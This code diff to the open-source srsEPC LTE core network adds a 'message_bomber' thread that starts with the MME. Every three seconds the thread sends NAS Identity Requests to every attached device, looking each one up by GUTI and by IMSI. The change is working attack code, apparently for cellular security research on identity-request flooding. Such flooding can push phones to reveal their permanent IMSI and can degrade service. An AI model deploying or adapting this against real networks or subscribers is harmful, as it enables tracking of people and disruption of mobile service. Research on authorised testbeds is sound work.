@@ -29,9 +29,17 @@
 namespace srsepc {
 
 mme*            mme::m_instance    = NULL;
+message_bomber* message_bomber::m_instance = NULL;
 pthread_mutex_t mme_instance_mutex = PTHREAD_MUTEX_INITIALIZER;
+pthread_mutex_t mb_instance_mutex = PTHREAD_MUTEX_INITIALIZER;
 
 mme::mme() : m_running(false), thread("MME")
+{
+  m_pool = srslte::byte_buffer_pool::get_instance();
+  return;
+}
+
+message_bomber::message_bomber() : m_running(false), thread ("message_bomber")
 {
   m_pool = srslte::byte_buffer_pool::get_instance();
   return;
@@ -41,6 +49,12 @@ mme::~mme()
 {
   return;
 }
+
+message_bomber::~message_bomber()
+{
+  return;
+}
+
 
 mme* mme::get_instance(void)
 {
@@ -52,6 +66,16 @@ mme* mme::get_instance(void)
   return (m_instance);
 }
 
+message_bomber* message_bomber::get_instance(void)
+{
+  pthread_mutex_lock(&mb_instance_mutex);
+  if (nullptr == m_instance) {
+    m_instance = new message_bomber();
+  }
+  pthread_mutex_unlock(&mb_instance_mutex);
+  return m_instance;
+}
+
 void mme::cleanup(void)
 {
   pthread_mutex_lock(&mme_instance_mutex);
@@ -60,6 +84,16 @@ void mme::cleanup(void)
     m_instance = NULL;
   }
   pthread_mutex_unlock(&mme_instance_mutex);
+}
+
+void message_bomber::cleanup(void)
+{
+  pthread_mutex_lock(&mb_instance_mutex);
+  if (nullptr != m_instance) {
+    delete m_instance;
+    m_instance = NULL;
+  }
+  pthread_mutex_unlock(&mb_instance_mutex);
 }
 
 int mme::init(mme_args_t*         args,
@@ -79,6 +113,12 @@ int mme::init(mme_args_t*         args,
     exit(-1);
   }
 
+  m_mb = message_bomber::get_instance();
+  if (m_mb->init(m_s1ap, s1ap_log)) {
+    m_s1ap_log->error("Error initializing message bomber\n");
+    exit(-1);
+  }
+
   /*Init GTP-C*/
   m_mme_gtpc = mme_gtpc::get_instance();
   if (!m_mme_gtpc->init(m_mme_gtpc_log)) {
@@ -92,6 +132,16 @@ int mme::init(mme_args_t*         args,
   return 0;
 }
 
+int message_bomber::init(s1ap* s1ap, srslte::log_filter* s1ap_log)
+{
+  m_s1ap = s1ap;
+  m_s1ap_log = s1ap_log;
+
+  m_s1ap_log->info("Message Bomber Initialized, BOMBING...\n");
+  srslte::console("Message Bomber Initialized, BOMBING...\n");
+  return 0;
+}
+
 void mme::stop()
 {
   if (m_running) {
@@ -102,6 +152,17 @@ void mme::stop()
     wait_thread_finish();
   }
   return;
+}
+
+void message_bomber::stop()
+{
+  if(m_running) {
+    m_running = false;
+    m_s1ap = nullptr;
+
+    thread_cancel();
+    wait_thread_finish();
+  }
 }
 
 void mme::run_thread()
@@ -122,6 +183,8 @@ void mme::run_thread()
   // Get S1-MME and S11 sockets
   int s1mme = m_s1ap->get_s1_mme();
   int s11   = m_mme_gtpc->get_s11();
+
+  m_mb->start();
 
   while (m_running) {
     pdu->clear();
@@ -191,6 +254,36 @@ void mme::run_thread()
     }
   }
   return;
+}
+
+void message_bomber::run_thread()
+{
+  srslte::byte_buffer_t* pdu = m_pool->allocate("message_bomber::run_thread");
+  uint32_t               sz  = SRSLTE_MAX_BUFFER_SIZE_BYTES - SRSLTE_BUFFER_HEADER_OFFSET;
+  m_running = true;
+
+  while (m_running) {
+    for (std::map<uint32, nas*>::iterator it = m_s1ap->m_tmsi_to_nas_ctx.begin(); it != m_s1ap->m_tmsi_to_nas_ctx.end(); it++) {
+      srslte::console("bombing with GUTI\n");
+      nas* nas_ctx = it->second;
+      srslte::byte_buffer_t* nas_tx = m_pool->allocate();
+      nas_ctx->pack_identity_request(nas_tx);
+      m_s1ap->send_downlink_nas_transport(
+          nas_ctx->m_ecm_ctx.enb_ue_s1ap_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id, nas_tx, nas_ctx->m_ecm_ctx.enb_sri);
+      m_pool->deallocate(nas_tx);
+    }
+
+    for (std::map<uint64_t, nas*>::iterator it = m_s1ap->m_imsi_to_nas_ctx.begin(); it!=m_s1ap->m_imsi_to_nas_ctx.end(); it++) {
+      srslte::console("bombing with IMSI\n");
+      nas* nas_ctx = it->second;
+      srslte::byte_buffer_t* nas_tx = m_pool->allocate();
+      nas_ctx->pack_identity_request(nas_tx);
+      m_s1ap->send_downlink_nas_transport(
+          nas_ctx->m_ecm_ctx.enb_ue_s1ap_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id, nas_tx, nas_ctx->m_ecm_ctx.enb_sri);
+      m_pool->deallocate(nas_tx);
+    }
+    sleep(3);
+  }
 }
 
 /*
